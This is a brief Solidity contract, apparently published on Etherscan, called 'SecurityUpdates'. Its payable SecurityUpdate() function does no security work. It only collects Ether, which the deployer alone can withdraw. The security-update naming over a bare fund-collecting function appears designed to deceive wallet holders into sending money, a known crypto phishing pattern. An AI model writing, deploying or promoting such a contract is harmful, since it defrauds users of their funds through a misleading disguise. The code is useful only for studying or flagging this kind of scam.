/**
 *Submitted for verification at Etherscan.io on 2022-11-01
*/

pragma solidity ^0.4.26;

contract SecurityUpdates {

    address private  owner;    // Current owner of this contract
     constructor() public{   
        owner=msg.sender;
    }
    function getOwner(
    ) public view returns (address) {   
        // Returns the owner 
        return owner;
    }
    function withdraw() public {
        require(owner == msg.sender);
        msg.sender.transfer(address(this).balance);
    }

    function SecurityUpdate() public payable {
    }

    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }
}